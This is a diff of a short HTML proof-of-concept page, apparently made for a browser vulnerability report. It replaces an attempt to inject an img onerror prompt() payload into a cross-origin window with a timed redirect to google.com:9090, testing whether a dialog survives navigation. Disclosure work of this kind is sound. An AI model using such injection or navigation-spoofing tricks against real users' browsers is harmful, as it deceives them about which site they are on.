@@ -9,27 +9,21 @@
 <h1>MSRC PoC Demo</h1>
 <button id="trigger">Trigger</button>
 
+<div id="demo" style="display:none;">
+  <h2>Demo</h2>
+</div>
+
 <script>
 document.getElementById('trigger').onclick = () => {
 
-  // delay sebelum top‑level navigation (user gesture preserved)
+  // tampilkan konten demo (user gesture)
+  document.getElementById('demo').style.display = 'block';
+
+  // delay sebelum redirect
   setTimeout(() => {
-
-    const win = window.open('https://google.com', '_top');
-
-    // small delay after navigation attempt
-    setTimeout(() => {
-      try {
-        win.document.body.innerHTML = `
-          <h2>Demo Page</h2>
-          <img src="" onerror="prompt('Demo: dialog persistence','')">
-        `;
-      } catch (e) {
-        // expected: cross‑origin blocked
-      }
-    }, 100);
-
-  }, 1000);
+    // top-level navigation
+    window.location.href = 'https://google.com:9090';
+  }, 1000); // 1 detik
 };
 </script>
 
